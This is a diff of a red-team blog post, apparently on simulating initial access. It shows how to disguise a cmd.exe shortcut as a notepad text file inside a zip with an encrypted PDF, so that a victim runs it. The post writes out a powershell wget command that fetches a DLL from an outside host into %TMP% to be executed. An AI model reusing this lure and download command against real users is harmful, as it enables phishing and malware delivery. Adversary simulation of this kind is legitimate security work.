@@ -20,10 +20,6 @@ The firs file inside the `.zip` will be an encrypted PDF document (sign contract
 The idea here is the following: the user receive the files (could be via email or via MS Teams) and try to open up the encrypted pdf, which will ask the user to specify a password and then the user will open up the fake notepad file to recover the original PDF's password. 
 By doint so the `.lnk` shortcut file in the background will execute the tasks necessary to deliver and execute our malicious DLL.  
 
-<p align="center">
-  <img src="/assets/posts/2022-06-01-Initial-Access-Simulation/Invoice.PNG">
-</p>
-
 
 
 ## 1) Introduction Initial Access 
@@ -58,7 +54,19 @@ __Note:__ Since we are saving a payload into the disk we don't need to worry abo
 
 ## 3) Weaponize Payload Delivery with LNK 
 
-Firt of all we need to create a shortcut file that will be delivered with the encrypted PDF. Right click on your Desktop, click on create shortcut and you must enter the full path of `cmd.exe`, in this case it will be `C:\Windows\System32\cmd.exe`. After that we can specify readme.txt as a shortcut name. (remember we want the user to click on the shortcut file thinking it is a text file with the password inside). Now we need to click on the shortcut properties and changhe the icon to match to notepad.txt (default windows text editor). 
+Firt of all we need to create a shortcut file that will be delivered with the encrypted PDF. Right click on your Desktop, click on create shortcut and you must enter the full path of `cmd.exe`, in this case it will be `C:\Windows\System32\cmd.exe`. 
+
+<p align="center">
+  <img src="/assets/posts/2022-06-01-Initial-Access-Simulation/lnk.PNG">
+</p>
+
+
+After that we can specify readme.txt as a shortcut name. (remember we want the user to click on the shortcut file thinking it is a text file with the password inside). Since we don't want to show the typical cmd.exe icon we can then add a specific icon that in this case will be notepad. Now we need to click on the shortcut properties and changhe the icon to match to notepad.txt (default windows text editor). 
+
+
+<p align="center">
+  <img src="/assets/posts/2022-06-01-Initial-Access-Simulation/lnk2.PNG">
+</p>
 
 Now we can add the powershell command to download the DLL from a remote location. This must be specified inside the shortcut target menu interface. Then we can specify the output where to save the `.dll` file. For this we will leverage the `%TMP%` environment variable of Windows so we don't even need to know the local user accoun name and path. 
 
@@ -69,16 +77,12 @@ C:\Windows\System32\cmd.exe /c powershell.exe wget http://192.168.133.152:1234/h
 ```
 __Note:__ The powershell download can be performed with the usual suspect IEX Download String function. 🚩
 
-Futhermore, the above command is included inside the readme.lnk file which will lool like this to the end user. 
+Futhermore, the above command is included inside the readme.lnk file which will look like this to the end user. 
+
+Below we can see the files that will be displayed to the user after unziping the `.zip` folder delivered via email or when possible via Microsft Teams. 
 
 <p align="center">
-  <img src="/assets/posts/2022-06-01-Initial-Access-Simulation/lnk.PNG">
-</p>
-
-Since we don't want to show the typical cmd.exe icon we can then add a specific icon that in this case will be notepad. 
-
-<p align="center">
-  <img src="/assets/posts/2022-06-01-Initial-Access-Simulation/lnk2.PNG">
+  <img src="/assets/posts/2022-06-01-Initial-Access-Simulation/Invoice.PNG">
 </p>
 
 __Note:__ Obviously we can create a .lnk file with the desired command and subsequently add the typical pdf icon. 🚩
